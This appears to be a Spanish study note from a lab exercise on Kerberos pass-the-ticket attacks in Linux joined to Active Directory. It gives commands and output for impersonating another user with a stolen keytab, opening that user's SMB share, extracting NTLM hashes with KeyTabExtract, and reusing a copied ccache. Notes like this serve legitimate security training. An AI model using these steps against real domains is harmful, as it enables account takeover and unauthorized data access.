# Pass the ticket en LINUX

## Conceptos a tener en cuenta

### Keytab

- **Definición:** Un keytab es un archivo que almacena pares de claves (principal y clave) para servicios o usuarios. Estos pares son utilizados por Kerberos para autenticación sin necesidad de que un usuario introduzca manualmente su contraseña.

- Uso: Se usa principalmente en servidores para servicios que necesitan autenticarse en un dominio AD. El archivo keytab permite que estos servicios inicien sesión en Kerberos sin intervención humana.

### Ccache

- **Definición:** Ccache (credential cache) es un archivo utilizado por Kerberos para almacenar tickets de autenticación temporalmente. Cuando un usuario se autentica, Kerberos guarda su Ticket Granting Ticket (TGT) en este archivo.

- Uso: Se utiliza para almacenar tickets que permiten acceder a servicios dentro del dominio AD sin necesidad de volver a autenticarse cada vez.

## Kerberos en Linux

- Autenticación en Kerberos: Cuando un usuario o servicio quiere autenticarse con AD en un entorno Linux, se inicia una solicitud de autenticación Kerberos. Si el usuario ha iniciado sesión, su TGT se almacena en el archivo ccache. Para los servicios que necesitan autenticarse automáticamente, se usa el archivo keytab.

- Acceso a servicios: Una vez autenticado, Kerberos proporciona tickets de servicio almacenados en el ccache. Estos tickets son presentados a servicios dentro del dominio para obtener acceso.

- Configuración: Los archivos keytab se configuran utilizando herramientas como ktutil o mediante scripts proporcionados por administradores de AD. Los ccache se manejan automáticamente por kinit y otros comandos relacionados con Kerberos.

### Comandos utiles

- `realm list` Lista información del AD
- `klist` Lista información de kerberos

## Recomendado utilizar linikatz para extraer toda esta info

### Impersonando un usuario con keytab

```
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```

- Ahora, nos metemos a la carpeta compartida de este nuevo usuario **Carlos**

```
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls

  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

                7706623 blocks of size 4096. 4452852 blocks available
```

## KeyTabExtract abusar

- Para extraer los secretos de un archivo keytab, utilizamos KeyTabExtract.

```python3 keytabexcract.py USER.keytab```

- Ya con el NTLM podemos hacer todos los ataque conocidos

## Importing the ccache File into our Current Session
```
cp /tmp/krb5cc_647401106_5Eidyq .
export KRB5CCNAME=/root/krb5cc_647401106_5Eidyq
klist
smbclient //DC01/julio -k
```